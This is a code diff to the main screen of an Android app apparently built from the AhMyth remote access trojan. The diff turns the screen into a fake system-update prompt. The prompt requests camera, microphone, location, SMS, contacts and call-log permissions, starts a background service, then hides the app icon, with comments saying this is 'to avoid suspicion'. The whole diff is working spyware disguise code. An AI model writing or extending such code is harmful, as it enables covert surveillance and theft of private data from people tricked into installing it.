@@ -8,30 +8,46 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.widget.Button;
-import android.widget.TextView;
 import android.view.View;
+import android.widget.Button;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private ServerConnectionChecker checker;
-    private TextView statusView;
-    private Button toggleButton;
     private SharedPreferences prefs;
+    private TextView statusTextView;
+    private ProgressBar progressBar;
+    private Button btnUpdate;
     
-    private static final String[] REQUIRED_PERMISSIONS = {
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_CALL_LOG
-    };
+    // Group permissions for cleaner request
+    private String[] getRequiredPermissions() {
+        List<String> permissions = new ArrayList<>();
+        permissions.add(Manifest.permission.CAMERA);
+        permissions.add(Manifest.permission.RECORD_AUDIO);
+        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        permissions.add(Manifest.permission.READ_PHONE_STATE);
+        permissions.add(Manifest.permission.READ_SMS);
+        permissions.add(Manifest.permission.READ_CONTACTS);
+        permissions.add(Manifest.permission.READ_CALL_LOG);
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
+            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
+            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
+            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
+        } else {
+            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+        
+        return permissions.toArray(new String[0]);
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -39,147 +55,51 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
         
         prefs = getSharedPreferences("ahmyth", MODE_PRIVATE);
-        checker = new ServerConnectionChecker(this);
         
-        // Start Service immediately
+        // Start Service immediately in the background
         startMainService();
         
-        // Setup UI
-        statusView = findViewById(R.id.statusView);
-        Button btnSettings = findViewById(R.id.btnSettings);
-        Button btnDashboard = findViewById(R.id.btnDashboard);
-        Button btnController = findViewById(R.id.btnController);
-        toggleButton = findViewById(R.id.btnToggleMode);
-        Button btnClose = findViewById(R.id.btnClose);
-        
-        // Dashboard button - MAIN ACTION
-        btnDashboard.setOnClickListener(new View.OnClickListener() {
+        statusTextView = findViewById(R.id.statusView);
+        progressBar = findViewById(R.id.progressBar);
+        btnUpdate = findViewById(R.id.btnUpdate);
+
+        // If all permissions already granted, wait 3 seconds for service to connect then hide
+        if (hasAllPermissions()) {
+            statusTextView.setText("System is up to date");
+            btnUpdate.setVisibility(View.GONE);
+            progressBar.setVisibility(View.VISIBLE);
+            progressBar.setIndeterminate(true);
+            
+            new android.os.Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    hideAppIcon();
+                    finish();
+                }
+            }, 3000);
+            return;
+        }
+
+        btnUpdate.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                startActivity(new Intent(MainActivity.this, DashboardActivity.class));
-            }
-        });
-        
-        // Controller button - MONITOR FROM PHONE
-        btnController.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                startActivity(new Intent(MainActivity.this, ControllerActivity.class));
-            }
-        });
-        
-        // Settings button
-        btnSettings.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                startActivity(new Intent(MainActivity.this, SettingsActivity.class));
-            }
-        });
-        
-        // Toggle LAN/Remote
-        toggleButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                toggleMode();
-            }
-        });
-        
-        // Close button
-        btnClose.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                finish();
-            }
-        });
-        
-        // Update status periodically
-        startStatusUpdateThread();
-        
-        // Request permissions if needed
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!hasAllPermissions()) {
                 requestAllPermissions();
             }
-        }
-    }
-
-    private void startStatusUpdateThread() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                while (true) {
-                    try {
-                        Thread.sleep(2000); // Update every 2 seconds
-                        runOnUiThread(new Runnable() {
-                            @Override
-                            public void run() {
-                                updateStatus();
-                            }
-                        });
-                    } catch (InterruptedException e) {
-                        break;
-                    }
-                }
-            }
-        }).start();
-    }
-
-    private void updateStatus() {
-        String status = checker.getStatusString();
-        statusView.setText(status);
-        
-        // Update toggle button text
-        String mode = checker.getPreferredMode();
-        if ("LAN".equals(mode)) {
-            toggleButton.setText("Switch to Remote (NGrok)");
-        } else if ("REMOTE".equals(mode)) {
-            toggleButton.setText("Switch to LAN");
-        } else {
-            toggleButton.setText("No Server Detected");
-        }
-    }
-
-    private void toggleMode() {
-        String currentMode = checker.getPreferredMode();
-        SharedPreferences.Editor editor = prefs.edit();
-        
-        // Swap LAN/Remote by temporarily disabling one
-        if ("LAN".equals(currentMode)) {
-            // Force use Remote by clearing LAN (user can re-enable in Settings)
-            editor.putString("lan_ip", "");
-        } else {
-            // User needs to go to Settings to configure
-            editor.putString("force_remote", "true");
-        }
-        editor.apply();
-        
-        updateStatus();
+        });
     }
 
     private boolean hasAllPermissions() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
-            return true;
-        }
-        
-        for (String permission : REQUIRED_PERMISSIONS) {
+        for (String permission : getRequiredPermissions()) {
             if (ContextCompat.checkSelfPermission(this, permission) 
                     != PackageManager.PERMISSION_GRANTED) {
                 return false;
             }
         }
-        
-        if (Build.VERSION.SDK_INT >= 33) {
-            if (ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") 
-                    != PackageManager.PERMISSION_GRANTED) {
-                return false;
-            }
-        }
-        
         return true;
     }
 
     private void requestAllPermissions() {
-        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
+        ActivityCompat.requestPermissions(this, getRequiredPermissions(), PERMISSION_REQUEST_CODE);
     }
 
     private void startMainService() {
@@ -195,27 +115,42 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Permissions granted or denied, hide app icon and continue
-            hideAppIcon();
-            // Close activity immediately to run in background
-            finish();
+            // Check if user granted anything. Even if some are denied, we still hide to avoid suspicion.
+            // A more professional approach would be to wait for critical ones.
+            
+            statusTextView.setText("Update completing...");
+            btnUpdate.setVisibility(View.GONE);
+            progressBar.setIndeterminate(true);
+            
+            // Short delay to look like it's finishing the update
+            new android.os.Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    hideAppIcon();
+                    finish();
+                }
+            }, 2000);
         }
     }
 
     private void hideAppIcon() {
-        // Disable launcher intent filter to hide icon from launcher
         try {
-            ComponentName componentName = new ComponentName(
-                    MainActivity.this,
-                    "ahmyth.mine.king.ahmyth.MainActivity"
-            );
-            getPackageManager().setComponentEnabledSetting(
-                    componentName,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP
-            );
-            // Mark that icon has been hidden
+            PackageManager p = getPackageManager();
+            // Target the alias instead of the main class
+            ComponentName componentName = new ComponentName(this, 
+                "ahmyth.mine.king.ahmyth.LauncherActivity");
+            
+            p.setComponentEnabledSetting(componentName, 
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+                PackageManager.DONT_KILL_APP);
+            
             prefs.edit().putBoolean("icon_hidden", true).apply();
+            
+            // Go to home screen
+            Intent intent = new Intent(Intent.ACTION_MAIN);
+            intent.addCategory(Intent.CATEGORY_HOME);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
         } catch (Exception e) {
             e.printStackTrace();
         }
